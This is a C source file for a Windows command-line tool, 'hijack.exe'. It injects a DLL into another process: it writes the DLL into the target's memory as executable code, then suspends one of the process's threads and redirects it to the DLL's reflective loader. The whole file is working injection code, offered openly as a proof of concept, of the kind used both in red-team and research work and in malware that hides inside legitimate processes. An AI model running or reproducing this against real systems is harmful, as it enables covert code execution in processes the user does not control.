#include <Windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>

#include "loader.h"

HANDLE find_thread(DWORD dwPID)
{
	THREADENTRY32 te32 = { 0 };
	HANDLE ret = INVALID_HANDLE_VALUE;
	HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

	te32.dwSize = sizeof(THREADENTRY32);

	do
	{
		if (!Thread32First(hThreadSnap, &te32))
			break;

		do
		{
			if (te32.th32OwnerProcessID == dwPID)
			{
				if (!(ret = OpenThread(THREAD_SUSPEND_RESUME | THREAD_SET_CONTEXT | THREAD_GET_CONTEXT, FALSE, te32.th32ThreadID)))
					ret = INVALID_HANDLE_VALUE;
				break;
			}
		} while (Thread32Next(hThreadSnap, &te32));
	} while (0);

	CloseHandle(hThreadSnap);

	return ret;
}

BOOL write_remote_mem(HANDLE hProc, LPCVOID pLocalMem, SIZE_T nSize, PVOID *pMem, DWORD dwFlags)
{
	SIZE_T nBytes = 0;
	DWORD dwWritten = 0;
	DWORD dwProtect = 0;
	BOOL ret = FALSE;

	do
	{
		*pMem = VirtualAllocEx(hProc, NULL, nSize, MEM_COMMIT, PAGE_READWRITE);

		if (!*pMem)
			break;

		if (!WriteProcessMemory(hProc, *pMem, pLocalMem, nSize, &nBytes))
			break;

		if (!VirtualProtectEx(hProc, *pMem, nSize, dwFlags, &dwProtect))
			break;

		ret = TRUE;
	} while (0);

	if (!ret && *pMem)
		VirtualFreeEx(hProc, *pMem, nSize, MEM_FREE);

	return ret;
}

BOOL execute_dll(HANDLE hProc, HANDLE hThread, PVOID pRemoteDll, DWORD dwOffset)
{
	static const DWORD REFLECTIVE_STACK_SIZE = 0x2000;
	BOOL ret = FALSE;
	CONTEXT ctx = { 0 };
	PVOID pRemoteCtx = NULL;
	PVOID pRemoteStack = NULL;

	if (SuspendThread(hThread) == -1)
		return FALSE;

	do
	{
		ctx.ContextFlags = CONTEXT_FULL;
		if (!GetThreadContext(hThread, &ctx))
			break;

		if (!write_remote_mem(hProc, &ctx, sizeof(ctx), &pRemoteCtx, PAGE_READWRITE))
			break;

#ifdef _M_IX86
		ctx.Eip = (DWORD)pRemoteDll;
#elif defined(_M_AMD64)

		ctx.Rip = (DWORD64)pRemoteDll + dwOffset;
		ctx.Rcx = (DWORD64)pRemoteCtx;

		SIZE_T nBytes = 0;
		if (!WriteProcessMemory(hProc, (LPVOID)(((LPBYTE)pRemoteDll) + 2), &ctx.Rcx, sizeof(ctx.Rcx), &nBytes))
			break;

		// let stack have some room to grow up or down
		ctx.Rsp = ctx.Rsp - REFLECTIVE_STACK_SIZE;
#endif

		if (!SetThreadContext(hThread, &ctx))
			break;

		ret = TRUE;
	} while (0);

	ResumeThread(hThread);
	return ret;
}


BOOL thread_continue(DWORD dwPID, PVOID pLocalDll, SIZE_T nDllSize, DWORD dwOffset)
{
	BOOL ret = FALSE;
	HANDLE hThread = INVALID_HANDLE_VALUE;
	PVOID pRemoteDll = NULL;
	DWORD dwOpenFlags = PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ;
	//DWORD dwOpenFlags = PROCESS_ALL_ACCESS;

	HANDLE hProc = OpenProcess(dwOpenFlags, FALSE, dwPID);

	if (hProc == INVALID_HANDLE_VALUE)
		return FALSE;

	do 
	{
		hThread = find_thread(dwPID);
		if (hThread == INVALID_HANDLE_VALUE)
			break;

		if (!write_remote_mem(hProc, pLocalDll, nDllSize, &pRemoteDll, PAGE_EXECUTE_READ))
			break;
		
		if (!execute_dll(hProc, hThread, pRemoteDll, dwOffset))
			break;

		ret = TRUE;
	} while (0);

	if (hThread != INVALID_HANDLE_VALUE)
		CloseHandle(hThread);

	CloseHandle(hProc);

	return ret;
}

BOOL read_file(const char *szDllPath, PVOID *pMem, SIZE_T *nSize)
{
	BOOL ret = FALSE;

	// screw it
#pragma warning(disable: 4996)
	FILE *f = fopen(szDllPath, "rb");
#pragma warning(error: 4996)

	if (!f)
		return FALSE;

	fseek(f, 0, SEEK_END);
	*nSize = ftell(f);

	if (nSize > 0)
	{
		fseek(f, 0, SEEK_SET);

		*pMem = malloc((*nSize) + 1);
		fread(*pMem, *nSize, 1, f);

		ret = TRUE;
	}

	fclose(f);

	return ret;
}

int main(int argc, char **argv)
{
	if (argc < 3)
	{
		printf("Usage: hijack.exe [dllpath] [PID]\n");
		return -1;
	}
	
	char *szDllPath = argv[1];
	DWORD dwPID = atoi(argv[2]);

	SIZE_T nDllSize = 0;
	PVOID pLocalDll = NULL;

	if (!read_file(szDllPath, &pLocalDll, &nDllSize))
	{
		printf("Unable to read DLL file: %s\n", szDllPath);
		return -2;
	}

	DWORD dwOffset = GetReflectiveLoaderOffset(pLocalDll);

	//((char*)pLocalDll)[dwOffset] = 0xcc;

	if (dwOffset == 0)
	{
		printf("Unable to find ReflectiveLoader() offset.\n");
		return -3;
	}

	// now that we have DLL in memory and offset to reflective loader,
	// we can get to the real PoC.
	// Optional: get debug privs before calling thread_continue()

	if (!thread_continue(dwPID, pLocalDll, nDllSize, dwOffset))
	{
		printf("Inject failed with code: %d\n", GetLastError());
		free(pLocalDll); // superfluous
		return -4;
	}
	
	printf("Inject success!\n");
	free(pLocalDll);

	return 0;
}
